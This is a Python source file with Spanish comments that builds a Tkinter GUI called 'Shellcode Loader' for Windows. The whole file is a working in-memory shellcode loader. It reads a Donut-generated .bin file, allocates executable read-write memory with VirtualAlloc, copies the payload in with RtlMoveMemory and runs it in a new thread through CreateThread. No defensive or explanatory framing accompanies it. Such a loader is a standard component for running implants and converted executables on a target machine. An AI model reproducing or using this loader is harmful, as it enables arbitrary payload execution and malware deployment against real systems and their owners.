#!/usr/bin/env python3
# shell_gui.py - Interfaz gráfica para ejecutar shellcode .bin (Donut)
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
import ctypes
from ctypes import wintypes
import threading
import os
import sys

# Constantes de Windows
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40
INFINITE = 0xFFFFFFFF

class ShellcodeExecutor:
    def __init__(self, root):
        self.root = root
        self.root.title("Shellcode Executor v1.0")
        self.root.geometry("600x500")
        self.root.resizable(True, True)
        self.root.configure(bg='#1e1e1e')
        
        # Variables
        self.bin_path = tk.StringVar()
        
        # Estilos
        self.fg_color = '#d4d4d4'
        self.bg_color = '#1e1e1e'
        self.btn_bg = '#0e639c'
        self.btn_fg = '#ffffff'
        self.entry_bg = '#2d2d2d'
        
        self.setup_ui()
        
    def setup_ui(self):
        # Frame principal
        main_frame = tk.Frame(self.root, bg=self.bg_color)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Título
        title = tk.Label(main_frame, text="Shellcode Loader", font=('Segoe UI', 16, 'bold'),
                         fg='#4ec9b0', bg=self.bg_color)
        title.pack(pady=(0, 20))
        
        # Frame para selección de archivo
        file_frame = tk.Frame(main_frame, bg=self.bg_color)
        file_frame.pack(fill=tk.X, pady=5)
        
        lbl_file = tk.Label(file_frame, text="Archivo .bin:", font=('Segoe UI', 10),
                            fg=self.fg_color, bg=self.bg_color)
        lbl_file.pack(side=tk.LEFT, padx=(0, 10))
        
        self.entry_file = tk.Entry(file_frame, textvariable=self.bin_path, font=('Segoe UI', 10),
                                   bg=self.entry_bg, fg=self.fg_color, insertbackground='white')
        self.entry_file.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        
        btn_browse = tk.Button(file_frame, text="Examinar", command=self.browse_file,
                               bg=self.btn_bg, fg=self.btn_fg, font=('Segoe UI', 9),
                               padx=10, pady=2, cursor='hand2')
        btn_browse.pack(side=tk.RIGHT)
        
        # Botón ejecutar
        self.btn_execute = tk.Button(main_frame, text="EJECUTAR SHELLCODE", command=self.execute_shellcode,
                                     bg='#2d2d2d', fg='#4ec9b0', font=('Segoe UI', 11, 'bold'),
                                     padx=20, pady=8, cursor='hand2', borderwidth=1, relief=tk.RAISED)
        self.btn_execute.pack(pady=20)
        
        # Área de logs
        log_frame = tk.LabelFrame(main_frame, text="Registro de eventos", font=('Segoe UI', 9, 'bold'),
                                  fg=self.fg_color, bg=self.bg_color, bd=1, relief=tk.SUNKEN)
        log_frame.pack(fill=tk.BOTH, expand=True)
        
        self.log_area = scrolledtext.ScrolledText(log_frame, height=12, font=('Consolas', 9),
                                                   bg='#1e1e1e', fg='#d4d4d4', insertbackground='white',
                                                   wrap=tk.WORD, borderwidth=0)
        self.log_area.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Configurar colores de tags para logs
        self.log_area.tag_config('info', foreground='#4ec9b0')
        self.log_area.tag_config('error', foreground='#f48771')
        self.log_area.tag_config('success', foreground='#6a9955')
        
        # Estado inicial
        self.log("Inicializado. Seleccione un archivo .bin generado con Donut.", 'info')
    
    def log(self, message, tag='info'):
        """Añadir mensaje al área de logs"""
        self.log_area.insert(tk.END, f"[*] {message}\n", tag)
        self.log_area.see(tk.END)
        self.root.update_idletasks()
    
    def browse_file(self):
        """Abrir diálogo para seleccionar archivo .bin"""
        filename = filedialog.askopenfilename(
            title="Seleccionar archivo .bin",
            filetypes=[("Binarios shellcode", "*.bin"), ("Todos los archivos", "*.*")]
        )
        if filename:
            self.bin_path.set(filename)
            self.log(f"Archivo seleccionado: {filename}", 'info')
    
    def execute_shellcode(self):
        """Ejecutar el shellcode en un hilo separado"""
        path = self.bin_path.get().strip()
        if not path:
            messagebox.showerror("Error", "Por favor, seleccione un archivo .bin")
            return
        if not os.path.exists(path):
            messagebox.showerror("Error", f"El archivo no existe:\n{path}")
            return
        
        # Deshabilitar botón durante la ejecución
        self.btn_execute.config(state=tk.DISABLED)
        self.log("Iniciando ejecución del shellcode...", 'info')
        
        # Ejecutar en otro hilo para no bloquear la GUI
        thread = threading.Thread(target=self._inject_and_run, args=(path,), daemon=True)
        thread.start()
    
    def _inject_and_run(self, path):
        """Función que realiza la inyección (corre en hilo separado)"""
        try:
            # 1. Leer el archivo .bin
            with open(path, "rb") as f:
                shellcode = f.read()
            if not shellcode:
                self.log("El archivo está vacío", 'error')
                self._enable_button()
                return
            self.log(f"Shellcode cargado: {len(shellcode)} bytes", 'success')
            
            # 2. Cargar DLLs
            kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
            ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
            
            # Configurar tipos
            kernel32.VirtualAlloc.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
            kernel32.VirtualAlloc.restype = wintypes.LPVOID
            ntdll.RtlMoveMemory.argtypes = [wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t]
            kernel32.CreateThread.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD]
            kernel32.CreateThread.restype = wintypes.HANDLE
            kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
            
            # 3. Reservar memoria RWX
            ptr = kernel32.VirtualAlloc(None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
            if not ptr:
                err = ctypes.get_last_error()
                self.log(f"VirtualAlloc falló. Error: {err} (0x{err:08X})", 'error')
                self._enable_button()
                return
            self.log(f"Memoria reservada en: {hex(ptr)}", 'info')
            
            # 4. Copiar shellcode con RtlMoveMemory
            ntdll.RtlMoveMemory(ptr, shellcode, len(shellcode))
            self.log("Shellcode copiado a memoria", 'success')
            
            # 5. Crear hilo de ejecución
            thread_id = wintypes.DWORD()
            h_thread = kernel32.CreateThread(None, 0, ptr, None, 0, ctypes.byref(thread_id))
            if not h_thread:
                err = ctypes.get_last_error()
                kernel32.VirtualFree(ptr, 0, 0x8000)
                self.log(f"CreateThread falló. Error: {err} (0x{err:08X})", 'error')
                self._enable_button()
                return
            
            self.log(f"Shellcode ejecutándose en hilo ID: {thread_id.value}", 'success')
            messagebox.showinfo("Éxito", f"Shellcode inyectado correctamente.\nHilo ID: {thread_id.value}")
            
            # Esperar a que termine (opcional, evita que se cierre la GUI)
            kernel32.WaitForSingleObject(h_thread, INFINITE)
            kernel32.CloseHandle(h_thread)
            
        except Exception as e:
            self.log(f"Excepción: {str(e)}", 'error')
        finally:
            self._enable_button()
    
    def _enable_button(self):
        """Reactivar botón desde el hilo principal"""
        self.root.after(0, lambda: self.btn_execute.config(state=tk.NORMAL))

if __name__ == "__main__":
    root = tk.Tk()
    app = ShellcodeExecutor(root)
    root.mainloop()
